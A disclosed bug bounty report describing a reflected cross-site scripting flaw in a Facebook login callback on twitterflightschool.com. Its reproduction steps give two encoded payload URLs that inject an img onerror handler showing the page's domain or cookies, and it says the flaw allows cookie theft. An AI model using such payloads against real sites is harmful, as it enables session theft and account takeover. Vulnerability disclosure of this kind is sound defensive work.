# Reflected XSS in twitterflightschool.com

## Report Details
- **Report ID**: 770349
- **URL**: https://hackerone.com/reports/770349
- **State**: Closed
- **Severity**: none
- **Submitted**: 2020-01-08T17:42:07.205Z
- **Disclosed**: 2020-02-21T20:26:38.914Z

## Reporter
- **Username**: jubabaghdad
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
While testing twitterflightschool.com, I came across the below endpoint:

https://twitterflightschool.com/authentication/fb_callback?error=access_denied&error_code=200&error_description=

I noticed that it is possible to inject JS payload in "error_description=" parameter and trigger XSS in twitterflightschool.com


Reproduction Steps:
==============

Here we go
https://twitterflightschool.com/authentication/fb_callback?error=access_denied&error_code=200&error_description=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.domain%29%3E

https://twitterflightschool.com/authentication/fb_callback?error=access_denied&error_code=200&error_description=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.cookie%29%3E

## Impact

This is will allow the attacker to steal users cookies

## Attachments
No attachments
